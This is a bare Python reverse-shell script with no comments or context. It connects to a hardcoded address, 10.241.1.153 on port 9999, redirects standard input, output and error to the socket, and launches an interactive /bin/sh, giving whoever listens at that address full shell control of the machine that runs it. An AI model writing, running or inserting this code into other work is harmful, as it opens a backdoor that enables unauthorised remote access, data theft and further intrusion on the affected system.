import socket
import subprocess
import os

ip = '10.241.1.153'
port = 9999

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

os.dup2(sock.fileno(), 0)  
os.dup2(sock.fileno(), 1)  
os.dup2(sock.fileno(), 2) 

subprocess.call(["/bin/sh", "-i"])
